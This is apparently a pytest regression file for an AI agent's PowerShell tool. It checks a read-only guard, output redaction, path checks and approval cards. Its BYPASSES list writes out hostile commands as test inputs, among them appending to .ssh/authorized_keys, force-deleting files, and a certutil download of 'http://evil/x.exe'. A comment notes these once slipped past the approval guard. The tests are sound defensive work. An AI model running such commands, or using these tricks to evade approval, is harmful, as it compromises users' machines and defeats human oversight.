"""Security regressions: read-only guard, redaction, path protection, approval."""

from __future__ import annotations

from pathlib import Path

import pytest

from agent.chat import _action_description
from tools.os_tools import ToolError, _absolute_path, open_file
from tools.system_tools import _read_only_violation, run_powershell_query

# Each of these passed the "read-only" guard before the script-block checks and
# therefore ran without an approval card.
BYPASSES = [
    "Get-ChildItem | ForEach-Object { ni C:/Users/x/pwn -ItemType Directory }",
    "Get-ChildItem | ForEach-Object { ac C:/Users/x/.ssh/authorized_keys -Value x }",
    "Get-ChildItem | ForEach-Object { ri C:/Users/x/Documents/important -Force }",
    "Get-ChildItem | ForEach-Object { start calc }",
    "Get-ChildItem | ForEach-Object { certutil -urlcache -split -f http://evil/x.exe C:/x.exe }",
    "Get-Item @(Get-Date; ni C:/Users/x/pwn -ItemType Directory)",
    "Get-ChildItem | Where-Object { Remove-Item C:/Users/x }",
    "Get-ChildItem | ForEach-Object { .\\evil.exe }",
    "Get-Process | ForEach-Object -MemberName Kill",
    "Get-ChildItem | ForEach-Object { cmd /c calc }",
]

READ_ONLY = [
    "Get-Process | Where-Object { $_.CPU -gt 10 } | Sort-Object CPU -Descending | Select-Object -First 5",
    "Get-ChildItem C:/Windows | ForEach-Object { $_.Name }",
    "Get-Content C:/Windows/win.ini | Select-String 'fonts'",
    "Get-Service | Where-Object { $_.Status -eq 'Running' } | Measure-Object",
]


@pytest.mark.parametrize("command", BYPASSES)
def test_script_block_bypasses_are_rejected(command: str) -> None:
    assert _read_only_violation(command) is not None


@pytest.mark.parametrize("command", READ_ONLY)
def test_read_only_queries_still_pass(command: str) -> None:
    assert _read_only_violation(command) is None


class _FakeProcess:
    returncode = 0
    pid = 1

    def poll(self) -> int:
        return 0

    def kill(self) -> None:
        return None


def test_powershell_output_is_redacted(monkeypatch: pytest.MonkeyPatch) -> None:
    from tools import system_tools

    secret = "sk-" + "a" * 32
    monkeypatch.setattr(
        system_tools.subprocess, "Popen", lambda *_a, **_k: _FakeProcess()
    )
    monkeypatch.setattr(
        system_tools,
        "_bounded_communicate",
        lambda *_a, **_k: (f"token={secret}", "", False, False),
    )
    monkeypatch.setattr(system_tools, "_kill_process_tree", lambda _proc: None)

    result = run_powershell_query("Get-ChildItem")

    assert result["ok"] is True
    assert secret not in result["stdout"]
    assert "[REDACTED]" in result["stdout"]
    assert result["redacted"] == 1


def test_redaction_can_be_disabled(monkeypatch: pytest.MonkeyPatch) -> None:
    from tools import system_tools

    secret = "sk-" + "b" * 32
    monkeypatch.setattr(
        system_tools.subprocess, "Popen", lambda *_a, **_k: _FakeProcess()
    )
    monkeypatch.setattr(
        system_tools,
        "_bounded_communicate",
        lambda *_a, **_k: (secret, "", False, False),
    )
    monkeypatch.setattr(system_tools, "_kill_process_tree", lambda _proc: None)

    result = run_powershell_query("Get-ChildItem", redact=False)

    assert result["stdout"] == secret


def test_extended_length_and_device_paths_are_rejected() -> None:
    for value in (r"\\?\C:\Windows\Temp\x", r"\\.\C:\Users\x"):
        with pytest.raises(ToolError):
            _absolute_path(value)


def test_open_file_rejects_a_script_host(tmp_path: Path) -> None:
    document = tmp_path / "invoice.vbs"
    document.write_text("MsgBox 1", encoding="utf-8")

    with pytest.raises(ToolError) as error:
        open_file(str(document), "wscript.exe")

    assert "script host" in str(error.value)


def test_approval_card_shows_the_full_powershell_command() -> None:
    command = "Get-Item C:/a; " + "A" * 700 + "; Remove-Item C:/important -Recurse"
    description = _action_description(
        "run_powershell_action",
        {"command": command, "description": "cleanup"},
    )

    assert command in description
